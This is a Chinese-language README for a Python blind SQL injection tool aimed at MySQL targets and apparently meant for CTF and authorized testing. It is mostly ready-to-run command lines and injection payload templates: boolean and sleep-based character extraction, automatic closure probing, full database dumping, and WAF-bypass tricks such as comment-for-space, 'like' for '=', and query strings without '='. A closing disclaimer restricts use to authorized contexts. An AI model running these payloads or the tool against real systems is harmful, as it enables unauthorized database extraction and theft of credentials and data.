# ⚡ BLIND SQLi

> 通用 Boolean-Based / Time-Based SQL 盲注提取工具，为 CTF、授权测试与本地靶场场景打磨的轻量级单文件脚本。

![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)
![Version](https://img.shields.io/badge/version-1.9.1-important)
![依赖](https://img.shields.io/badge/dependencies-requests%20only-9cf)
![平台](https://img.shields.io/badge/platform-Windows%20%2F%20Linux%20%2F%20macOS-lightgrey)

## 目录

- [特性](#特性)
- [与 sqlmap 的对比](#与-sqlmap-的对比)
- [快速开始](#快速开始)
- [使用示例](#使用示例)
- [参数速查](#参数速查)
- [POST 注入](#post-注入)
- [原始请求注入（REQUEST_URI / 绕 WAF）](#原始请求注入request_uri--绕-waf)
- [历史结果管理](#历史结果管理)
- [时间盲注](#时间盲注)
- [安全声明](#安全声明)

## 特性

- **单文件、零依赖负担**：整个工具就是一个 `blind_sqli.py`，只需 `pip install requests` 即可运行，拷贝到任何机器（包括靶机）都能直接使用。
- **智能 true/false 特征识别**：自动识别响应差异（marker / 页面长度 / 状态码三级策略），针对静态页面做了专门优化——即使 true/false 响应只差 2 个字节（如 `query_success` vs `query_error`）也能稳定识别。
- **GET / POST 自适应**：`--method POST` 即可切换注入方式；POST 请求体支持表单与 JSON 两种格式，可用 `--data` 补齐其余字段，URL 自带查询串（如 `?action=login`）自动保留，直接打通登录框、API 这类 POST 注入点。
- **原始请求注入**：`--raw-request` 或让 `-u` 里带 `*`，payload 会替换标记并按字节原样发送（不做 URL 编码），可注入到请求行 / URL / `REQUEST_URI` 等任意位置，用来打通「注入点不在参数里」「需要绕过编码与 WAF」的题目。
- **回显感知（echo-aware）**：自动剔除落在“请求回显区”的伪特征，并用真实提取 payload 复核，杜绝“基线探测能过、正式提取全废”。
- **自动闭合方式探测**：数字型、单引号、双引号、括号等常见闭合方式自动识别，无需手工猜测。
- **精细化盲注提取**：长度二分 + ASCII 二分 + 等值校验三重机制；可选字符集边界预检；支持 `--hex` 直接提取十六进制数据。
- **并发与断点**：多线程并发加速提取；断点续传 + 中间结果落盘（带保存节流）。
- **一键枚举数据库**：`--dump`（跳过系统库）/ `--dump-all`（含系统库）自动完成「数据库 → 表 → 列 → 全量数据」枚举，结果保存到 `result/` 目录并自动回放。
- **关键词搜索**：`--dump-flag <关键词>` 在表名、列名、数据中搜索包含关键词的内容，命中部分红色高亮。
- **系统库名预判**：库名枚举时，库名前缀命中 `information_schema` / `mysql` / `performance_schema` / `sys` 就先尝试预判并校验边界，成功即补全、省去长名字的逐位猜解；预判失败会继续逐位注入，已提取过的库名不会重复预判。默认开启（`--no-db-predict` 关闭，`--db-predict-len N` 调整前缀阈值）。
- **历史管理**：`--view [URL]` 随时回看历次 dump 记录，结果文件按「主机_端口_时间」命名，不覆盖旧记录。
- **时间盲注支持**：`--time-based` 一键切换到时间盲注模式，基于 sleep + 响应时间判定，自动调整 timeout，同样支持自动闭合探测、`--dump` 等全部功能。
- **Windows 友好**：双击运行不闪退（`Press Enter to continue...`）、GBK 控制台自动 UTF-8 容错、原生支持 ANSI 颜色。

## 与 sqlmap 的对比

| 维度 | BLIND SQLi | sqlmap |
| --- | --- | --- |
| 体积与依赖 | 单文件，仅依赖 requests | 大型工程，依赖众多 |
| 启动速度 | < 1 秒 | 数秒 |
| 注入类型 | Boolean-Based + Time-Based 盲注 | 全类型：布尔 / 报错 / 时间 / UNION / 堆叠 / OOB |
| 数据库支持 | MySQL 系 | MySQL / MSSQL / Oracle / PostgreSQL / SQLite 等 |
| 上手成本 | 参数少，`-h` 分组清晰 | 功能全但参数海量 |
| 输出噪音 | 简洁，直达结果 | 日志与提示较多 |
| 定制性 | payload 模板完全透明，可手写任意表达式 | 自定义需 tamper 体系 |
| 结果管理 | `result/` + `--view` 一键回看 | session / output 机制较复杂 |

### 本工具占优的场景

1. **CTF 抢时间**：对静态靶场页面的特征识别极快，实测 4 线程约 12 秒提取 32 位 flag；sqlmap 的检测阶段更长、输出更啰嗦。
2. **手写 payload 绕过滤**：`--payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -"` 这类模板直接暴露在命令行，表达式随便改，不需要学 tamper 脚本。
3. **受限环境部署**：一个文件 + requests 就能跑，无需拖整个目录树。
4. **Windows 双击用户**：不闪退、不乱码，看完结果按回车退出。
5. **结果归档复盘**：一键全量 dump + 按时间存档 + 关键词搜索高亮 + 历史回看，打完 CTF 随时复盘。

### 什么时候应该用 sqlmap

- 需要报错注入、时间盲注、UNION、堆叠查询、OOB 等高级注入手法；
- 目标不是 MySQL（如 MSSQL / Oracle / PostgreSQL）；
- 需要自动爬取表单、自动发现注入点、WAF 绕过、哈希破解、`--os-shell` 等能力；
- 大规模资产测试或 API 集成。

一句话：**sqlmap 是瑞士军刀，BLIND SQLi 是一把为布尔 + 时间盲注场景磨快的专用刀。**

## 快速开始

```bash
# 1. 安装依赖
pip install requests

# 2. 全自动布尔盲注提取（自动探测闭合方式 + 自动识别 true/false 特征）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --probe-closure --auto-mark

# 3. 全自动时间盲注提取（无回显差异时，基于 sleep 响应时间判定）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --time-based --probe-closure

# 4. 全自动枚举整个数据库（库 → 表 → 列 → 全量数据）
python blind_sqli.py -u "http://target/index.php?id=1" --dump
```

## 使用示例

```bash
# 1) 基础用法：手动指定 true 特征，提取单条查询
python blind_sqli.py -u "http://target/index.php?id=1" -p id \
    -q "select flag from flag" --true-mark "Welcome"

# 2) 字符型注入（单引号闭合）：需显式指定 payload 模板
python blind_sqli.py -u "http://target/index.php?id=1" -p id \
    -q "select flag from secret" --true-mark "User found" \
    --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -" \
    --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" \
    --len-payload "1' and length(({query}))>{mid}-- -"

# 3) 提取 HEX 数据（如密码哈希）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select password from users limit 1" --hex

# 4) 高并发 + 断点续传（适合长时间提取）
python blind_sqli.py -u "http://target/index.php?id=1" -t 8 \
    --resume result.tmp --save-every 10

# 5) 全量枚举：--dump 跳过系统库，--dump-all 包含系统库
python blind_sqli.py -u "http://target/index.php?id=1" --dump
python blind_sqli.py -u "http://target/index.php?id=1" --dump-all

# 6) 关键词搜索并高亮（表名/列名/数据，不含系统库）
python blind_sqli.py -u "http://target/index.php?id=1" --dump-flag flag

# 7) 查看历史 dump 记录
python blind_sqli.py --view "http://target.com"   # 指定目标的最新记录
python blind_sqli.py --view                       # 列出全部历史

# 8) 时间盲注（适用于页面无回显差异，但可利用 sleep 延迟的场景）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --time-based --probe-closure

# 9) 时间盲注 + 自定义 sleep 秒数 + 字符型闭合
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --time-based --sleep-time 3 \
    --time-payload "1' and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -" \
    --time-eq-payload "1' and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -" \
    --time-len-payload "1' and if(length(({query}))>{mid},sleep({sleep}),0)-- -"

# 10) POST 注入：表单提交，注入 username，其余字段用 --data 补齐
python blind_sqli.py -u "http://target/login.php?action=login" \
    --method POST -p username \
    --data "password=1" "submit=Login" \
    -q "select flag from flag" --probe-closure --auto-mark

# 11) POST 注入：JSON 请求体（自动设置 Content-Type: application/json）
python blind_sqli.py -u "http://target/api/login" \
    --method POST --json-body -p username \
    --data "password=1" \
    -q "select flag from flag" --probe-closure --auto-mark
```

> 详细说明与完整示例见 `python blind_sqli.py --help`，选项按「基本参数 / 特征自动识别 / 请求控制 / 提取控制 / 数据库枚举 / 其他」分组展示。

## 参数速查

| 参数 | 说明 |
| --- | --- |
| `-u, --url` | 目标 URL（自带查询串会保留：剔除注入参数后其余参数自动带上，避免双参数歧义） |
| `-p, --param` | 注入参数名 |
| `-q, --query` | 要提取的 SQL 查询 |
| `--preset uri` | 懒人预设：原始请求注入 + 时间盲注 + 无空格/无等号 WAF 绕过，自动填好 payload 模板与紧凑化 `-q` |
| `--method, -X` | HTTP 方法：`GET`（默认）/ `POST` |
| `--data, -d` | 附加请求参数（`k=v`，可多个）：GET 并入查询串，POST 并入请求体；可放任意字段，`-p` 指定的注入字段会被 payload 覆盖 |
| `--json-body` | POST 时以 JSON 提交请求体（自动设置 `Content-Type: application/json`） |
| `--content-type` | 自定义 POST 表单体的 `Content-Type` |
| `--raw-request FILE` | 原始 HTTP 请求模板文件，`*` 为注入点，按字节原样发送（不做 URL 编码） |
| `--raw-ssl` | 原始请求模式强制使用 HTTPS |
| `--auto-mark` | 自动识别 true/false 响应特征 |
| `--probe-closure` | 自动探测闭合方式 |
| `--true-mark` | 手动指定 true 特征字符串 |
| `--payload / --eq-payload / --len-payload` | 大于 / 等值 / 长度判断的 payload 模板 |
| `-t, --threads` | 并发线程数 |
| `--resume / --save-every / --save-interval` | 断点续传与保存节流 |
| `--hex` | 提取 `hex(({query}))` 结果，字符集自动收缩为十六进制 |
| `--dump` | 全量拉取用户数据库（跳过系统库），保存到 `result/` |
| `--dump-all` | 全量拉取所有数据库（含系统库） |
| `--dump-flag 关键词` | 搜索表名/列名/数据并高亮命中（也支持 `-dump-flag`） |
| `--view [URL]` | 查看历史 dump 记录 |
| `--no-db-predict` | 关闭库名枚举的系统库预判（默认开启） |
| `--db-predict-len N` | 系统库预判所需最短前缀位数（默认 3） |
| `--no-verify` | 跳过 TLS 证书校验（自签名证书目标） |
| `--time-based` | 启用时间盲注模式（基于 sleep + 响应时间判定） |
| `--sleep-time` | 时间盲注 sleep 秒数（默认 5.0） |
| `--time-payload / --time-eq-payload / --time-len-payload` | 时间盲注自定义 payload 模板（含 `{sleep}` 占位符） |
| `--non-interactive` | Windows 下退出时不等待回车（无人值守） |

## POST 注入

登录框、API 接口这类注入点通常用 POST 提交，且请求体里除注入参数外还有其它必填字段。加 `--method POST` 即可切换提交方式，用 `--data` 补齐其余字段：

```bash
# 表单型：注入 username，补齐 password / submit
python blind_sqli.py -u "http://target/login.php?action=login" \
    --method POST -p username \
    --data "password=1" "submit=Login" \
    -q "select flag from flag" --probe-closure --auto-mark

# JSON 型：自动以 {"username": "<payload>", "password": "1"} 提交
python blind_sqli.py -u "http://target/api/login" \
    --method POST --json-body -p username \
    --data "password=1" \
    -q "select flag from flag" --probe-closure --auto-mark
```

要点：

- **URL 查询串自动保留**：`?action=login` 这类 GET 参数会随 POST 一起发出，不会被丢掉；
- **注入字段由 payload 覆盖**：`-p` 指定的字段会填入 payload，写在 `--data` 里也一样会被覆盖，不会报错；
- **其余字段按需补齐**：`--data` 支持多个 `k=v`（值内可含 `=`，按首个 `=` 拆分）；
- **全部功能通用**：自动闭合探测、特征识别、`--dump`、`--dump-all`、`--dump-flag`、时间盲注、断点续传在多线程下同样适用于 POST。

## 原始请求注入（REQUEST_URI / 绕 WAF）

有些题目的注入点根本不在某个参数里，而是在请求行 / URL / `REQUEST_URI` 上，或者需要绕过参数过滤与 WAF。用 `--raw-request`（或让 `-u` 里带 `*`）让 payload 替换标记并按字节原样发送，就能覆盖这类场景。

懒人版（推荐）：`--preset uri` 会自动配好时间盲注 + 三个 payload 模板，并把 `-q` 里的空格转成 `/**/`：

```bash
python blind_sqli.py --preset uri \
    -u "http://target:8080/?*" --method POST --data "username=a" "password=b" \
    -q "select group_concat(flag) from target_table" --non-interactive
```

`-q` 正常写带空格的 SQL 即可；`--sleep-time` 不写时默认 1.2s。下面是等价的完整写法：

```bash
# 方式一：-u 里带 *，自动进入原始请求模式
python blind_sqli.py -u "http://target:8080/?*" --method POST \
    --data "username=a" "password=b" \
    -q "select/**/flag/**/from/**/flag" --time-based --sleep-time 3 \
    --time-payload "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#" \
    --time-eq-payload "x',if(ascii(substr(({query}),{i},1))like/**/{mid},sleep({sleep}),0))#" \
    --time-len-payload "x',if(length(({query}))>{mid},sleep({sleep}),0))#"

# 方式二：完整原始请求模板放在文件里（* 为注入点），适合自定义 Header / 复杂请求
python blind_sqli.py --raw-request raw_request.example.txt -q "select/**/flag/**/from/**/flag" \
    --time-based --sleep-time 3 \
    --time-payload "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#" \
    --time-len-payload "x',if(length(({query}))>{mid},sleep({sleep}),0))#"
```

典型场景：注入点是拼接进 SQL 的 `REQUEST_URI`（或任意请求行内容），而 WAF 只检查参数“值”。此时让查询串不含 `=`，PHP 会把它解析成“无值参数”（值为空），值检查自然落空，注入即可顺畅通过。

```bash
# raw_request.txt 内容参考仓库 raw_request.example.txt（把 Host 换成目标地址）
# 约束：请求行不能有空格、查询串不能出现 =；所以查询与 payload 统一用 /**/ 当空格、用 > 比较
python blind_sqli.py --raw-request raw_request.txt \
    -q "select/**/group_concat(flag)/**/from/**/target_table" --time-based --sleep-time 1 \
    --time-payload "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#" \
    --time-eq-payload "x',if(ascii(substr(({query}),{i},1))like/**/{mid},sleep({sleep}),0))#" \
    --time-len-payload "x',if(length(({query}))>{mid},sleep({sleep}),0))#" \
    --max-len 300 --non-interactive
```

要点：

- **`*` 就是注入点**：脚本把它替换成 payload，其余部分原样发送，`#`、`'` 等字符不会被 URL 编码；
- **无 `=` 的查询串**：利用「只把 `=` 后面的内容当参数值」的解析特性绕过「值检查」型 WAF；
- **注释当空格**：请求行不能含空格，SQL 里用 `/**/` 分隔关键字；
- **等值判断用 `like/**/N`**：不能写 `=` 时，`col=val` 等价于 `col like val`；注意 `like99` 会被当成标识符，必须留分隔符；
- **时间盲注串行**：脚本对 `--time-based` 强制 `-t 1`（并发会让响应耗时互相干扰而误判），并在结尾对未确定位单线程复核。

## 历史结果管理

- 每次 `--dump` / `--dump-all` 的结果自动保存到脚本同目录的 `result/` 文件夹；
- 文件名格式：`主机_端口_年月日-时分.txt`，例如 `challenge-xxx.sandbox.ctfhub.com_10800_2026-8-26-18-48.txt`；
- 同一分钟重复执行自动追加序号，不覆盖旧记录；
- `--view URL` 查看指定目标的最新记录，`--view` 列出全部历史。

## 时间盲注

当目标页面无论注入条件真假都没有任何回显差异时（纯盲注），可以使用 `--time-based` 切换到时间盲注模式：

- **原理**：注入 `if(条件, sleep(N), 0)`，通过响应延迟判定条件真假
- **自动调整 timeout** 为 `sleep_time + 5s`，避免 sleep 触发请求超时
- **自动探测闭合方式**（时间版）：数字型、单引号、双引号等 6 种候选
- **兼容所有现有功能**：`--dump`、`--dump-all`、`--dump-flag`、断点续传等；依赖耗时判定，故强制单线程（`-t 1`），并在结尾对未确定位自动复核
- **可自定义** `--time-payload` 等模板适配任意闭合方式（非 MySQL 的 `waitfor delay` 需自行编写 payload）

```bash
# 最简单的用法：全自动（探测闭合 + 提取）
python blind_sqli.py -u "http://target/index.php?id=1" \
    -q "select flag from flag" --time-based --probe-closure --non-interactive
```

## 库名枚举的系统库预判

`--dump` / `--dump-all` / `--dump-flag` 第一步都要把 `information_schema.schemata` 的库名列表
整体提取出来。库名列表里通常混着 `information_schema`、`performance_schema` 这类 18 位长名字，
逐位猜解非常耗时，因此脚本在库名枚举时默认开启「系统库预判」：

- **先预判、后校验**：某个库名前缀达到 N 位（默认 3，可用 `--db-predict-len N` 调整）后，若该前缀
  只可能对应一个系统库名，就先发起一次预判并用 1~2 次请求校验边界；成功才补全整个名字、跳过
  剩余位的猜解，失败则记为预判失败并继续逐位注入，结果不受影响；
- **边界校验防误判**：补全前用 1~2 次等值请求确认名字后一位是分隔符（`|` / `,`）或恰好到结果
  末尾，所以 `sysadmin`、`performance_schemaXYZ` 这类用户库不会被误判成系统库；
- **不重复预判**：本轮已提取/已补全过的库名不会再次参与预判；
- **可关闭**：`--no-db-predict` 退回纯逐位提取（结果一致，只是更慢）。

```bash
# 默认开启预判
python blind_sqli.py --preset uri -u "http://target/?*" --method POST \
    --data username=a password=b --time-based --dump

# 关闭预判 / 调整前缀位数
python blind_sqli.py -u "http://target/index.php?id=1" --dump --no-db-predict
python blind_sqli.py -u "http://target/index.php?id=1" --dump --db-predict-len 4
```

## 安全声明

> 本工具仅用于 CTF 竞赛、授权渗透测试或本地靶场。请勿对未获得授权的系统使用，滥用后果自负。
